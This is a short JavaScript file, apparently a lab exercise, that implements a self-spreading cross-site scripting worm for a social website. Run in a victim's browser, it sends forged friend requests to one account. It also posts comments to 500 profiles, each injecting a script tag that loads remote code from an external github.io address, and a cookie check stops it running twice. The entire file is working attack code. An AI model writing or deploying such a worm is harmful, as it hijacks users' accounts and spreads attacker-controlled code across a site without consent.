//Bryan Richiez

function creepy_crawler(){
  for(let id = 0; id < 500; id++) {
    var add_friends = new XMLHttpRequest();
    var add_comment = new XMLHttpRequest();
    var payload = encodeURIComponent("<script src=\"http://bryan1651.github.io/myScript.js\">I have added you as a friend.</script>");
    add_friends.open("GET", `/add_friend.php?id=${101}`, true);
    add_friends.send();
    add_comment.open("GET", `/add_comment.php?id=${id}&comment=${payload}`, true);
    add_comment.send();
  }
}

const not_again = new URLSearchParams(document.cookie.replaceAll("; ","&"))
if (not_again.get("Cookies") != "yes") {
  creepy_crawler()
}

document.cookie = "Cookies=yes"    
